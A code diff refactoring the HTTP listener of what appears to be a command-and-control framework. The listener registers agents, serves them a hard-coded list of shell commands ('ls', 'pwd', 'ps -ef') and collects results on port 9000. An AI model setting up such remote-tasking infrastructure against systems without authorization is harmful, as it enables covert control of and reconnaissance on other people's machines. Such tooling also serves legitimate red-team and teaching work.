@@ -8,15 +8,27 @@
 # listen on.
 # The BaseHTTPRequestHandler class enables management of your various
 # HTTP requests (e.g. GET, POST, etc)
-from http.server import BaseHTTPRequestHandler
+from http.server import HTTPServer, BaseHTTPRequestHandler
 
 
 from .listener_helper import register_agent, serve_tasks, collect_results
 
 tasklist = ['*cmd,ls', '*cmd,pwd,', '*cmd,ps,e,f']
 
+class Listener:
+    def __init__(self, name):
+        self.name = name
 
-class Listener(BaseHTTPRequestHandler):
+
+class http_server:
+    def __init__(self, listener):
+        Handler.listener = listener
+        server = HTTPServer(('', 9000), Handler)
+        server.serve_forever()
+
+
+class Handler(BaseHTTPRequestHandler):
+    listener = None
     def do_GET(self):
         if self.path.endswith('/tasks/uuid'):
             serve_tasks(self)
